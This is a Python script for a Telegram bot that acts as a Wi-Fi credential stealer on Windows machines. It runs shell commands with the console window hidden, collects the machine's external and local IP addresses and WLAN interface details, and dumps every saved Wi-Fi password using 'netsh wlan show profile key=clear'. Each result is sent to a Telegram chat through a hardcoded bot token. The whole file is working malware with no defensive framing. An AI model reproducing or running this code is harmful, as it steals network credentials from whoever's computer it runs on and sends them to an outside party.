import os
import subprocess
import requests
import telebot
import socket
import re

tek = '8307487774:AAFfcSTuSlseR0OA0lMrTajzV_oNg7d4kGA'
bot = telebot.TeleBot(tek)

def run_command(command):
    try:
        startupinfo = None
        if os.name == 'nt':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0 

        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            encoding='cp866', 
            errors='ignore',
            startupinfo=startupinfo
        )
        return result.stdout if result.stdout else result.stderr
    except Exception as e:
        return f"Error executing command: {str(e)}"

def local():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.connect(('8.8.8.8', 80))
    IP = s.getsockname()[0]
  except Exception:
    IP = '127.0.0.1'
  finally:
    s.close()
  return IP
  

def allips():
        external_ip = requests.get("https://api.ipify.org").text
        return external_ip
	

def netinfo():
    wlan_interface = run_command('netsh wlan show interface')
    wlan_profiles = run_command('netsh wlan show profile')
    
    return wlan_interface, wlan_profiles

def wifipass():
    passwords_info = "*WiFi Passwords Found:*\n\n"
    
    profiles_data = run_command('netsh wlan show profiles')
    
    networks = re.findall(r"All User Profile\s+:\s+(.*)\r?", profiles_data)
    
    if not networks:
        return " No WiFi profiles found or error occurred."

    for network in networks:
        network = network.strip()
        detail_command = f'netsh wlan show profile name="{network}" key=clear'
        detail_data = run_command(detail_command)
        
        password_match = re.search(r"Key Content\s+:\s+(.*)\r?", detail_data)
        
        if password_match:
            password = password_match.group(1).strip()
            passwords_info += f"*name:* `{network}`\n*Pass:* `{password}`\n"
        else:
            passwords_info += f"*name:* `{network}`\n*Pass:* `(None/Open/Protected)`\n"
        
        passwords_info += "-------------------\n"
        
    return passwords_info

@bot.message_handler(commands=['start'])
def start(message):
    
    bot.send_message(message.chat.id, f" *External IP:* `{allips()}`", parse_mode='Markdown')
    
    bot.send_message(message.chat.id, f";localip: {local()}")

    wlan_int, wlan_prof = netinfo()
    
    if wlan_int:
        bot.send_message(message.chat.id, f"*WLAN Interface:*\n```\n{wlan_int[:3500]}\n```", parse_mode='Markdown')

    bot.send_message(message.chat.id, f"{wifipass()}")

if __name__ == "__main__":
    bot.polling(none_stop=True)
